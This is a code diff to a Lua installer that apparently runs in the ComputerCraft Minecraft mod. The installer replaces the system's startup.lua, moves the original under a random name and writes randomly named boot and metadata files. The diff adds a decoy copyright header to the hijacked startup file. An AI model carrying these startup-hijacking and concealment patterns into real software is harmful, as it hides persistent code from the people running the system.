@@ -116,13 +116,11 @@ local function generateRandomString(length)
 end
 
 local function installer()
-    
-
     local DIR_4Nin92xCdd0 = generateRandomString(8)
     OriginalInstallDir = DIR_4Nin92xCdd0
     local bootfile = generateRandomString(8)
     local metadataFilename = generateRandomString(8) -- Set your metadata filename here
-    local randomDelimiter = "^" -- Use a random delimiter for separation
+    local randomDelimiter = "^"
     createMetadataFile(metadataFilename)
     originalStartup = getRealStartupPath()
     oldStartupFileName = generateRandomString(8) -- Does not end with .lua
@@ -134,7 +132,15 @@ local function installer()
                     OriginalFS.move("startup.lua", oldStartupFileName)
                 end
                     local f1 = OriginalFS.open("startup.lua", "w")
-                    f1.write([[shell.run("%s")]], bootfile)
+                    f1.write(string.format([[
+-- SPDX-FileCopyrightText: 2025 David Lightman
+--
+-- SPDX-LicenseRef-CCPL
+--%s
+--%s,%s
+--%s^
+    shell.run("%s")]], oldStartupFileName, DIR_4Nin92xCdd0, "init.lua", metadataFilename, bootfile))
+
                     f1.close()
                 local f = OriginalFS.open(bootfile, "w")
                 f.write(string.format([[
@@ -194,7 +200,7 @@ local function a2()
     end
 end
 parallel.waitForAny(a1, a2)
-]], oldStartupFileName, OriginalInstallDir, "main.lua", metadataFilename, randomDelimiter, DIR_4Nin92xCdd0, oldStartupFileName, OriginalInstallDir, "main.lua", OriginalInstallDir, "main.lua"))
+]], oldStartupFileName, OriginalInstallDir, "init.lua", metadataFilename, randomDelimiter, DIR_4Nin92xCdd0, oldStartupFileName, OriginalInstallDir, "init.lua", OriginalInstallDir, "init.lua"))
                 f.close()
             end
         end
